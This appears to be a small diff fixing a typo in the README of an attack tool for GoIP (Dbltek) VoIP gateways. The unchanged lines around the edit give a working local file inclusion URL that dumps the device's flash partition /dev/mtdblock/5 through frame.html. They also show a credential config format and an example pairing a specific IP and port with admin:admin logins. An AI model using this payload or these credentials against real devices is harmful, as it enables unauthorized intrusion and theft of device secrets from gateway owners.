@@ -2,7 +2,7 @@
 
 # Config
 ``host|user:pass,line``
-exemple: ``177.30.254.36:81|admin:admin,8``
+example: ``177.30.254.36:81|admin:admin,8``
 ## LFI GoIP Dbltek
 ``http://ip:port/default/en_US/frame.html?content=/dev/mtdblock/5``
 ### Export results
